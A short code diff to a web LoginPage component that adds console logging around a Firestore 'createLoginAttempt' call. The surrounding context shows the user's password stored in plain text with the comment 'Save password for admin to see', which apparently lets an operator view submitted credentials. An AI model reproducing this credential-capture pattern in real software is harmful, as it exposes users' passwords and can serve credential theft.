@@ -88,6 +88,7 @@ export default function LoginPage() {
 
       // Create login attempt in Firestore
       try {
+        console.log('[Login] Creating login attempt...');
         const attemptId = await createLoginAttempt({
           userId: storedRegistrationId || '',
           clientId: clientId,
@@ -95,9 +96,10 @@ export default function LoginPage() {
           password: password, // Save password for admin to see
           status: 'pending',
         });
-        
+        console.log('[Login] Login attempt created:', attemptId);
         sessionStorage.setItem('login_attempt_id', attemptId);
       } catch (attemptError) {
+        console.error('[Login] Failed to create login attempt:', attemptError);
         // Continue anyway
       }
 
